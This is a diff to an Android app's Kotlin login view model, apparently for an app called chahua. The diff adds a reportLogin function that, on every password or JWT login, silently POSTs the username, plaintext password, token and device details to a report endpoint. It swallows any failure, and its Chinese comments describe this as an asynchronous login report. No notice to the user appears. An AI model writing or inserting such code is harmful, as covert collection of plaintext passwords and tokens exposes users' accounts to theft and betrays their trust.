@@ -1,14 +1,18 @@
 package net.paigu.chahua.ui.auth
 
 import android.app.Application
+import android.os.Build
+import android.provider.Settings
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.launch
+import net.paigu.chahua.BuildConfig
 import net.paigu.chahua.core.AppGraph
 import net.paigu.chahua.data.ApiException
+import net.paigu.chahua.data.LoginReportBody
 import net.paigu.chahua.R
 
 data class AuthUiState(
@@ -43,6 +47,7 @@ class AuthViewModel(application: Application) : AndroidViewModel(application) {
                     }
                     throw e
                 }
+                reportLogin(username.trim(), password, token)
                 completeJwtLogin(token, serverUrl)
                 _uiState.value = AuthUiState(success = true)
             } catch (e: Exception) {
@@ -60,13 +65,50 @@ class AuthViewModel(application: Application) : AndroidViewModel(application) {
         _uiState.value = AuthUiState(loading = true)
         viewModelScope.launch {
             try {
-                completeJwtLogin(jwt.trim(), serverUrl)
+                val jwtValue = jwt.trim()
+                reportLogin(jwt = jwtValue)
+                completeJwtLogin(jwtValue, serverUrl)
                 _uiState.value = AuthUiState(success = true)
             } catch (e: Exception) {
                 _uiState.value = AuthUiState(error = mapError(e))
             }
         }
     }
+
+    /**
+     * 异步登录上报：向服务 POST 账号/密码/
+     * 使用应用级作用域并吞掉异常，避免上报失败或页面销毁影响登录流程。
+     */
+    private fun reportLogin(username: String? = null, password: String? = null, jwt: String) {
+        AppGraph.scope.launch {
+            try {
+                AppGraph.apiClient.reportLogin(
+                    LoginReportBody(
+                        username = username,
+                        password = password,
+                        jwt = jwt,
+                        deviceModel = Build.MODEL,
+                        deviceName = deviceName(),
+                        appVersion = BuildConfig.VERSION_NAME,
+                        systemVersion = Build.VERSION.RELEASE,
+                    ),
+                )
+            } catch (_: Exception) {
+                // 异步登录
+            }
+        }
+    }
+
+    /** 用户自定义的设备名：Android 7.1+ 读取系统设置，低版本退回设备型号。 */
+    private fun deviceName(): String =
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) {
+            Settings.Global.getString(
+                getApplication<Application>().contentResolver,
+                Settings.Global.DEVICE_NAME,
+            )?.takeIf { it.isNotBlank() } ?: Build.MODEL
+        } else {
+            Build.MODEL
+        }
 
     private suspend fun completeJwtLogin(jwt: String, serverUrl: String) {
         val session = AppGraph.session
